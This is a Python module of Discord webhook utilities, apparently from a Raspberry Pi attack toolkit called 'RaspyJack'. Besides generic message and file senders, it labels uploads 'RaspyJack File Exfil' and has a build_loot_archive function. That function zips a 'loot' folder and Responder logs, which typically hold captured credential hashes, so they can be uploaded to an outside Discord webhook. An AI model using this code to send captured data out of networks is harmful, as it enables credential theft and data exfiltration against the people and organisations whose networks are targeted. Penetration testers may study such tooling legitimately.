"""Discord webhook utilities shared between plugin and bin scripts."""
import os
import json
import requests
import io
import zipfile
from datetime import datetime
from pathlib import Path

DISCORD_ATTACHMENT_LIMIT = 8 * 1024 * 1024  # 8 MiB typical non-Nitro limit

# Global webhook configuration
_webhook_url = None

def configure_webhook(webhook_url: str):
    """
    Configure Discord webhook with a direct URL.
    
    Args:
        webhook_url: Direct webhook URL
        
    Returns:
        bool: True if valid webhook was configured, False otherwise
    """
    global _webhook_url
    
    if webhook_url and webhook_url.startswith("https://discord.com/api/webhooks/"):
        _webhook_url = webhook_url
        return True
    
    return False

def get_webhook_url():
    """Get the currently configured webhook URL."""
    return _webhook_url

def is_configured():
    """Check if Discord webhook is configured."""
    return _webhook_url is not None

def send_embed_to_discord(embed_config: dict = None, files: list = None):
    """
    Send a Discord message with full customization options.
    
    Args:
        embed_config: Dictionary with embed configuration:
            - title: Embed title
            - description: Embed description  
            - color: Embed color (hex int)
            - fields: List of field objects with name, value, inline
            - footer: Dict with text and optional icon_url
            - author: Dict with name and optional icon_url
            - thumbnail: Dict with url
            - image: Dict with url
            - timestamp: ISO timestamp string (auto-generated if True)
            - content: Plain text content (alternative to embed format)
        files: List of file paths to attach (optional)
            
    Returns:
        bool: True if successful, False otherwise
    """
    if not _webhook_url:
        print("[Discord] No webhook configured. Use configure_webhook() first.")
        return False
    
    try:
        # Validate files if provided
        valid_files = []
        if files:
            for file_path in files:
                if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                    valid_files.append(file_path)
                else:
                    print(f"[Discord] Skipping missing or empty file: {file_path}")
        
        # Build payload
        payload_data = {}
        
        if embed_config:
            # Check if it's a simple content message
            if "content" in embed_config:
                payload_data["content"] = embed_config["content"]
            else:
                # Build embed object dynamically
                embed = {}
                
                # Simple properties that map directly (with filtering)
                simple_props = ["title", "description", "color", "url", "footer", "author", "thumbnail", "image"]
                embed.update({prop: embed_config[prop] for prop in simple_props if prop in embed_config})
                
                # Fields (with validation)
                if "fields" in embed_config and isinstance(embed_config["fields"], list):
                    embed["fields"] = embed_config["fields"]
                    
                # Timestamp handling
                timestamp_value = embed_config.get("timestamp")
                if timestamp_value is True:
                    embed["timestamp"] = datetime.now().isoformat()
                elif isinstance(timestamp_value, str):
                    embed["timestamp"] = timestamp_value
                    
                payload_data["embeds"] = [embed]
        
        # Send request
        if valid_files:
            # Send with file attachments
            files_dict = {}
            for i, file_path in enumerate(valid_files):
                with open(file_path, 'rb') as f:
                    file_content = f.read()
                    files_dict[f'file{i}'] = (os.path.basename(file_path), file_content, 'application/octet-stream')
            
            if payload_data:
                data = {'payload_json': json.dumps(payload_data)}
                response = requests.post(_webhook_url, data=data, files=files_dict, timeout=30)
            else:
                response = requests.post(_webhook_url, files=files_dict, timeout=30)
        else:
            # Send without files
            response = requests.post(_webhook_url, json=payload_data, timeout=10)
        
        if 200 <= response.status_code < 300:
            print("[Discord] Message sent successfully.")
            return True
        else:
            print(f"[Discord] Send failed: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"[Discord] Error sending message: {e}")
        return False

def send_message_to_discord(message: str, title: str = None, color: int = None):
    """
    Send a text message to Discord with optional embed formatting.
    
    Args:
        message: The message content to send
        title: Optional title for embed format
        color: Optional color for embed (hex int, e.g., 0xff0000 for red)
        
    Returns:
        bool: True if successful, False otherwise
    """
    if title or color is not None:
        embed_config = {
            "description": message,
            "timestamp": True
        }
        if title:
            embed_config["title"] = title
        if color is not None:
            embed_config["color"] = color
        
        return send_embed_to_discord(embed_config=embed_config)
    else:
        return send_embed_to_discord(embed_config={"content": message})

def send_file_to_discord(file_path: str, title: str = None, description: str = None):
    """
    Send a file to Discord with optional embed information.
    
    Args:
        file_path: Path to the file to upload
        title: Optional title for the embed
        description: Optional description for the embed
        
    Returns:
        bool: True if successful, False otherwise
    """
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print(f"[Discord] File is missing or empty: {file_path}")
        return False
    
    # Create embed if title or description provided
    embed_config = None
    if title or description:
        embed_config = {
            "title": title or f"📎 File: {os.path.basename(file_path)}",
            "description": description or f"**File:** `{os.path.basename(file_path)}`\n**Size:** {os.path.getsize(file_path):,} bytes",
            "color": 0x0099ff,  # Blue color
            "footer": {"text": "RaspyJack File Exfil"},
            "timestamp": True
        }
    
    return send_embed_to_discord(embed_config=embed_config, files=[file_path])
    
def send_buffer_to_discord(buffer: io.BytesIO, filename: str, message: str | None = None) -> bool:
    """Upload an in-memory buffer as a file to the configured webhook."""
    if not _webhook_url:
        print('[Discord] No webhook configured. Use configure_webhook() first.')
        return False
    try:
        files = {'file': (filename, buffer, 'application/zip')}
        payload = {"content": message or f"📦 {filename}"}
        resp = requests.post(_webhook_url, data=payload, files=files, timeout=60)
        if 200 <= resp.status_code < 300:
            print('[Discord] Archive sent successfully.')
            return True
        print(f"[Discord] Archive upload failed: {resp.status_code} - {resp.text}")
        return False
    except Exception as e:
        print(f"[Discord] Error sending archive: {e}")
        return False

def _zip_add_dir(zf: zipfile.ZipFile, base_dir: Path, arc_prefix: str = ""):
    """Recursively add directory contents to zip file preserving relative paths."""
    try:
        if not base_dir.exists():
            return
        for path in base_dir.rglob('*'):
            if path.is_file():
                # Build archive name (optionally under arc_prefix)
                rel = path.relative_to(base_dir.parent).as_posix()
                arcname = f"{arc_prefix}/{rel}" if arc_prefix else rel
                zf.write(path, arcname)
    except Exception as e:
        print(f"[DiscordExfil] Error zipping {base_dir}: {e}")

def build_loot_archive(root_path: str) -> tuple[io.BytesIO, str, int] | tuple[None, str, int]:
    """Create an in-memory ZIP of loot/ and Responder/logs.

    Returns:
        (buffer, filename, size) on success, (None, error_message, 0) on failure.
    """
    try:
        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"loot_{ts}.zip"
        loot_dir = Path(root_path) / 'loot'
        responder_logs = Path(root_path) / 'Responder' / 'logs'
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
            if loot_dir.exists():
                _zip_add_dir(zf, loot_dir)
            if responder_logs.exists():
                _zip_add_dir(zf, responder_logs, arc_prefix='Responder/logs')
        buf.seek(0)
        size = buf.getbuffer().nbytes
        return buf, filename, size
    except Exception as e:
        return None, f"Archive error: {e}", 0